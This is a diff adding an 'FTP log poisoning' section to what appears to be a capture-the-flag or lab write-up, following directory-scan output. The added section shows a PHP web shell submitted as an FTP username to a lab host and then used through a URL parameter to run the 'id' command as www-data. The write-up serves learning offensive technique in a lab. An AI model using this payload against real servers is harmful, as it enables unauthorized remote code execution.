@@ -173,5 +173,21 @@ Stopped: Tue May 20 12:35:34 2025
 /.                    (Status: 200) [Size: 1080]
 /server-status        (Status: 403) [Size: 278]
 Progress: 661680 / 661683 (100.00%)
-                                                                    
+
+## FTP log poisoning
+
+ftp 10.10.122.127
+Connected to 10.10.122.127.
+220 (vsFTPd 3.0.5)
+Name (10.10.122.127:kali): '<?php system($_GET['c']); ?>'
+331 Please specify the password.
+Password: 
+530 Login incorrect.
+ftp: Login failed
+ftp> 
+
+http://10.10.122.127/welcome.php?c=id
+Thu May 22 09:06:33 2025 [pid 1973] ['uid=33(www-data) gid=33(www-data) groups=33(www-data) '] FAIL LOGIN: Client "::ffff:10.8.28.108"
+
+
 
